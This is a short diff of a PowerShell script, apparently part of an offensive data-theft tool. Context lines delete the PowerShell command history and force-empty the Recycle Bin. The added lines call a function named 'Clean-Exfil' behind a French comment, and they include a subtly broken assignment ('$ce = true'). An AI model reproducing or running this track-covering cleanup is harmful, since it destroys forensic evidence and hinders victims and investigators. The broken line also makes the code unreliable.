@@ -50,3 +50,7 @@ Remove-Item (Get-PSreadlineOption).HistorySavePath -ErrorAction SilentlyContinue
 Clear-RecycleBin -Force -ErrorAction SilentlyContinue
 
 }
+
+# le truc de fin
+$ce = true
+if (-not ([string]::IsNullOrEmpty($ce))){Clean-Exfil}
